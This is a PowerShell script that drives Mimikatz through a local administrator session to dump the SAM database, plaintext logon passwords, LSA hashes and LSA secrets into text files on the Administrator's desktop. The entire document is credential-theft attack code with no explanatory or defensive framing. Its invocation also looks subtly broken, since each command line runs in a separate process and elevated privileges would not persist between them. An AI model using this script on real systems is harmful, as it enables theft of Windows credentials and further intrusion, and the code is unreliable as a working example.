# Step 1: Open a local PowerShell session as Administrator
$adminSession = New-PSSession -ComputerName 127.0.0.1 -Credential (Get-Credential -UserName "Administrator" -Message "Enter Administrator Password")

# Step 2: Define the Mimikatz command sets
$mimikatzCommandSets = @(
    "log C:\Users\Administrator\Desktop\mimiSAM.txt
    Privilege::debug
    Token::elevate
    lsadump::sam",

    "log C:\Users\Administrator\Desktop\mimiPW.txt
    Privilege::debug
    Token::elevate
    Sekurlsa::logonpasswords",

    "log C:\Users\Administrator\Desktop\mimiHASH.txt
    Privilege::debug
    Token::elevate
    lsadump::lsa",

    "log C:\Users\Administrator\Desktop\mimiSecrets.txt
    Privilege::debug
    Token::elevate
    lsadump::secrets"
)

# Step 3: Execute each command set within the session
foreach ($commands in $mimikatzCommandSets) {
    Invoke-Command -Session $adminSession -ScriptBlock {
        param($cmds)
        $cmds -split "`n" | ForEach-Object { & "C:\Path\To\Mimikatz.exe" $_ }
    } -ArgumentList $commands
}

# Step 4: Close the session
Remove-PSSession -Session $adminSession
